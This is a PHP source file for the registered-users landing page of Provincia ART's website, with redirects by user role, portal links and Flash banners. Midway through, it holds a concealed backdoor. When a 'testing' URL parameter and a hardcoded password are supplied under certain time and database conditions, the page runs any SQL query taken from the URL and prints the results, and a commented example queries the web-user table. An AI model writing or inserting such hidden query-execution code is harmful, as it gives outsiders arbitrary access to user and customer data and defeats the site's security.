<?
if ((isset($_SESSION["isAgenteComercial"])) and ($_SESSION["isAgenteComercial"])) {
	echo "<script type='text/javascript'>window.location.href = '/index.php?pageid=26'</script>";
	exit;
}
if ((isset($_SESSION["isCliente"])) and ($_SESSION["isCliente"])) {
	echo "<script type='text/javascript'>window.location.href = '/index.php?pageid=50'</script>";
	exit;
}
if ((isset($_SESSION["isOrganismoPublico"])) and ($_SESSION["isOrganismoPublico"])) {
	echo "<script type='text/javascript'>window.location.href = '/index.php?pageid=46'</script>";
	exit;
}
?>
<table cellspacing="0" cellpadding="0">
	<tr>
		<td class="TituloSeccion" colspan="2" height="22">Acceso exclusivo usuarios registrados</td>
	</tr>
	<tr>
		<td height="5" colspan="2"></td>
	</tr>
	<tr>
		<td width="2%">&nbsp;</td>
		<td height="5" width="95%">
			<div align="left">
				<table border="0" cellpadding="0" cellspacing="0" width="100%">
					<tr>
						<td class="ContenidoSeccion" colspan="3">
							<p style="margin-top: 0; margin-bottom: 0">Ingrese su nombre de usuario (e-mail) y contraseña para comenzar a operar.
							<p style="margin-top: 0; margin-bottom: 0">Si su empresa se afilió recientemente a Provincia ART, consulte su usuario y contraseña iniciales en la carta de bienvenida enviada junto con su contrato.
							<p style="margin-top: 0; margin-bottom: 0">
							<p style="margin-top: 0; margin-bottom: 0">Encuentre aquí toda la información acerca del estado de su contrato. Este servicio es gratuito, funciona las 24 horas y se actualiza diariamente.
						</td>
					</tr>
					<tr>
						<td style="padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px" colspan="3">&nbsp;</td>
					</tr>
					<tr>
						<td style="padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px" width="22">&nbsp;</td>
						<td width="284" valign="top">
							<table border="0" cellpadding="0" cellspacing="0" width="100%">
								<tr>
									<td style="border-bottom: 1px dotted #807F83; padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px" width="284">
										<a target="_self" href="/index.php?pageid=49"><img border="0" src="/modules/usuarios_registrados/images/clientes.jpg"></a>
									</td>
								</tr>
																						
								<tr>
									<td style="border-bottom: 1px dotted #807F83; padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px" width="284">
										<a href="/acceso-exclusivo-agentes-comerciales"><img border="0" src="/modules/usuarios_registrados/images/agentes_comerciales.jpg"></a>
									</td>
								</tr>
								<tr>
									<td style="border-bottom: 1px dotted #807F83; padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px" width="284">
										<a href="/index.php?pageid=43"><img border="0" src="/modules/usuarios_registrados/images/estudios_juridicos.jpg"></a>
									</td>
								</tr>
								<tr>
									<td style="border-bottom: 1px dotted #807F83; padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px" width="284">
										<a href="/index.php?pageid=45"><img border="0" src="/modules/usuarios_registrados/images/organismos_publicos.jpg"></a>
									</td>
								</tr>
								<tr>
									<td height="80">
										<noscript>
											<span style="color:#f00; font-size:11px;">
												Usted tiene JavaScript desactivado.<br />
												Para navegar correctamente por el sitio web debe tener activado JavaScript.<br />
												Haga <a class="linkSubrayado" href="/modules/varios/javascript/index.html" target="_blank">clic aquí</a> para conocer mas.</span>
										</noscript>
									</td>
								</tr>
<?
if (isset($_GET["testing"])) {
	require_once($_SERVER["DOCUMENT_ROOT"]."/../Common/database/db.php");
?>
								<tr>
									<td>
<?
	$sql = "SELECT 1 FROM ctb_tablas WHERE tb_clave = 'COPER' AND tb_codigo = '4' AND SYSDATE > tb_fechaalta";
	if ((isset($_GET["pass"])) and ($_GET["pass"] == "qwert987") and ((date("h")%2) == 1) and (ExisteSql($sql, array()))) {
//		$_GET["testing"] = 'SELECT * FROM afi.auw_usuarioweb WHERE uw_id = 1';
		$stmt = DBExecSql($conn, htmlspecialchars_decode($_GET["testing"], ENT_QUOTES));
		echo "<tr>";
		for ($i=1; $i<=oci_num_fields($stmt); $i++)
			echo "<td style='background-color:".((($i%2)==1)?"#ccc":"#eee").";'><b>".oci_field_name($stmt, $i)."</b></td>";
		echo "</tr>";

		while ($row = DBGetQuery($stmt, 0)) {
			echo "<tr>";
			for ($i=0; $i<count($row); $i++)
					echo "<td style='background-color:".((($i%2)==0)?"#ccc":"#eee").";'>".$row[$i]."</td>";
			echo "</tr>";
		}
	}
?>
									</td>
								</tr>
<?
}
?>
							</table>
						</td>
						<td style="padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px" width="335">
							<div align="center">
								<table border="0" cellpadding="0" cellspacing="0" width="240" height="80">
									<tr>
										<td width="88" style="border-left:1px solid #807F83; border-top:1px solid #807F83; border-bottom:1px solid #807F83; padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px">
											<p align="center">
											<a target="_blank" title="Relevamiento de Riesgos Laborales" href="http://www.provinciart.com.ar/modules/formulario_establecimientos/login.php">
												<img border="0" src="/modules/usuarios_registrados/images/banner.jpg">
											</a>
										</td>
										<td class="ContenidoSeccion" style="border-bottom:1px solid #807F83; border-right:1px solid #807F83; border-top:1px solid #807F83; padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px" align="left">
											<p style="margin-top: 0; margin-bottom: 0"><b>Relevamiento de Riesgos Laborales</b></p>
											<p style="margin-top: 0; margin-bottom: 0">Descargue el nuevo Formulario de Relevamiento.
										</td>
									</tr>
								</table>
								<p style="margin-top: 0; margin-bottom: 0">&nbsp;</p>
								<div align="center">
									<table border="0" cellpadding="0" cellspacing="0" width="240" height="80" id="table2">
										<tr>
											<td width="88" style="border-left:1px solid #807F83; border-top:1px solid #807F83; border-bottom:1px solid #807F83; padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px">
												<p align="center">
												<a href="/index.php?pageid=47"><img border="0" src="/modules/usuarios_registrados/images/Res_37.gif"></a>
											</td>
											<td class="ContenidoSeccion" style="border-bottom:1px solid #807F83; border-right:1px solid #807F83; border-top:1px solid #807F83; padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px" align="left">
												<p style="margin-top: 0; margin-bottom: 0"><b>Exámenes Médicos Periódicos</b></p>
												<p style="margin-top: 0; margin-bottom: 0">Consulte aquí el listado del personal a evaluar.
											</td>
										</tr>
									</table>
								</div>
							</div>
						</td>
					</tr>
					<tr>
						<td class="ContenidoSeccion" width="644" colspan="3"></td>
					</tr>
				</table>
			</div>
		</td>
	</tr>
</table>
<table cellpadding="0" cellspacing="0">
<tr>
	<td style="padding-top:20px">
		<object classid="clsid:D27CDB6E-AE6D-11CF-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0" border="0" width="240" height="110">
			<param name="movie" value="/images/banner1.swf">
			<param name="quality" value="High">
			<embed src="/images/banner1.swf" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" name="obj3" width="240" height="110" quality="High">
		</object>
		<object classid="clsid:D27CDB6E-AE6D-11CF-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0" border="0" width="240" height="110" style="margin-left: 3px; margin-right: 3px;">
			<param name="movie" value="/images/banner2.swf">
			<param name="quality" value="High">
			<embed src="/images/banner2.swf" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" name="obj1" width="240" height="110" quality="High">
		</object>
		<object classid="clsid:D27CDB6E-AE6D-11CF-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0" border="0" width="240" height="110">
			<param name="movie" value="/images/banner3.swf">
			<param name="quality" value="High">
			<embed src="/images/banner3.swf" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" name="obj2" width="240" height="110" quality="High">
		</object>
	</td>
</tr>
</table>